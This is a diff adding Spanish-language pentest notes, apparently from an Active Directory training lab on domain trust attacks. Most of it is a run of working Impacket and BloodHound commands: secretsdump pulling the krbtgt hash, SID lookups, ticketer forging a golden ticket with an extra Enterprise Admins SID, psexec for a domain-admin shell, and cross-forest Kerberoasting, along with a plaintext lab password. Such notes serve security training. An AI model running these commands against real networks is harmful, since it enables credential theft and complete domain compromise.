@@ -215,3 +215,39 @@ export KRB5CCNAME=dc01.ccache
 secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 #Me devuelve el NTLM
 
+---------- ---------- ---------- ----------
+	### Domain Trusts - Child
+[!] En este caso, el child domain al cual tenemos acceso y controlamos es el logistics.inlanefreight.local
+
+secretsdump.py logistics.inlanefreight.local/<usuario_valido>@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+#Permite obtener el hash NTLM de la cuenta krbtgt
+lookupsid.py logistics.inlanefreight.local/<usuario valido>@172.16.5.240 | grep "Domain SID"
+#Obtengo el SID del child domain
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+#Obtengo el SID del grupo de admins
+ticketer.py -nthash <krbtgt hash> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <sid del child dominio> -extra-sid <sid del grupo domain admin> <usuario a crear>
+#Obtengo el ticket
+export KRB5CCNAME=hacker.ccache
+#Almaceno el ticket en cache
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/<usuario creado>@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+#Obtengo shell como el usuario siendo domain admin
+
+----------
+        ### Attacking Domain Trusts - Cross-Forest
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+#Con un usuario valido para el dominio objetivo, podemos relquestear el SPN de usuarios
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+#Agregando la flag -request obtenemos el tgs del usuario del cual sacamos el SPN
+#Una vez obtenido se puede crackear y usar
+
+domain INLANEFREIGHT.LOCAL
+#Se agrega el dominio a /etc/resolv.conf
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+#Para hacer lo mismo con bloodhound usamos el comando de arriba.
+zip -r ilfreight_bh.zip *.json
+#Comprimirmos los archivos
+domain FREIGHTLOGISTICS.LOCAL
+#Agregamos el otro dominio al file /etc/resolv.conf
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+#Ejecutamos bloodhound nuevamente y podemos correr el comando 'Users with Foreign Domain Group' para obtener los usuarios
+
